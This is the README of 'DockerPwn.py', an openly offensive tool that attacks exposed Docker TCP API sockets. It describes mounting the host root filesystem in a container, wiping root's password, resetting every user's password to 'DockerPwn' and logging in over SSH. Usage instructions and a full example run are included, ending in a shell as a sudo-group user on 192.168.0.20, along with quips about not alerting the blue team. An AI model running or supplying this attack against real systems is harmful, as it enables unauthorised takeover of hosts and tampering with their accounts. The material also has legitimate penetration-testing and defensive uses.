# DockerPwn.py

Exploit for exposed Docker TCP Socket.

This will automatically create a container on the Docker host with the root filesystem mounted,
allowing arbitrary read and write of the root filesystem (which is bad).

Once created, the script will empty the password requirement for 'root', and will alter any user
with a valid Unix password to have a password of 'DockerPwn'

Once this is done, the script will attempt to use Paramiko to login to all users enumerated from 
/etc/passwd using the password 'DockerPwn', and a shell will be spawned. 

## Roadmap:

Utilize the limited command execution via Paramiko to get a better shell, and automatically escalate to root.


## Usage:
```
DockerPwn.py [-h] [--target TARGET] [--port PORT]

optional arguments:
  -h, --help       show this help message and exit
  --target TARGET  IP of Docker Host
  --port PORT      Docker API TCP Port
 ```
## Example Output:

```
Dylans-MacBook-Pro:~ dylan$ /usr/local/bin/python3 /Users/dylan/Documents/DockerPwn.py --target 192.168.0.20 --port 2375

[+] Successfully probed the API. Writing out list of containers just in case there's something cool.

[+] Downloading latest Alpine Image for a lightweight pwning experience.

[+] Alpine image is downloading to the host. Hope we aren't setting off any alarms. Sleeping for a bit.

[+] Alright, creating Alpine Linux Container now...

[+] Success! Created container with root volume mounted. Got ID 40b99b62bfb89181985fb38d1e2c4928efc22d72f48e83f989f2e822cf19bb5c!

[+] Starting container 40b99b62bfb89181985fb38d1e2c4928efc22d72f48e83f989f2e822cf19bb5c

[+] Container successfully started. Blue team will be with you shortly.

[+] Phew, alright. Creating the EXEC to change passwords.

[+] EXEC successfully created on container! Got ID bc5ee929577554b9bc573b33c4a7e811542657a6aaeba6791d07bbdcc602103f!

[+] Now triggering the EXEC to change passwords. Hope SSH is open...

[+] EXEC successfully triggered. Printing users found in /etc/passwd.

[!] User List: root daemon bin sys sync games man lp mail news uucp proxy www-data backup list irc gnats nobody systemd-network systemd-resolve syslog messagebus _apt lxd uuidd dnsmasq landscape pollinate sshd dylan

[+] OK, looking good. Attempting to open shell as root. This may take a minute or two.

[-] Login failed for root
[-] Login failed for daemon
[-] Login failed for bin
[-] Login failed for sys
[-] Login failed for sync
[-] Login failed for games
[-] Login failed for man
[-] Login failed for lp
[-] Login failed for mail
[-] Login failed for news
[-] Login failed for uucp
[-] Login failed for proxy
[-] Login failed for www-data
[-] Login failed for backup
[-] Login failed for list
[-] Login failed for irc
[-] Login failed for gnats
[-] Login failed for nobody
[-] Login failed for systemd-network
[-] Login failed for systemd-resolve
[-] Login failed for syslog
[-] Login failed for messagebus
[-] Login failed for _apt
[-] Login failed for lxd
[-] Login failed for uuidd
[-] Login failed for dnsmasq
[-] Login failed for landscape
[-] Login failed for pollinate
[-] Login failed for sshd
[+] Login succeeded for dylan!

DockerPwn@192.168.0.20> id
uid=1000(dylan) gid=1000(dylan) groups=1000(dylan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

DockerPwn@192.168.0.20> 
```
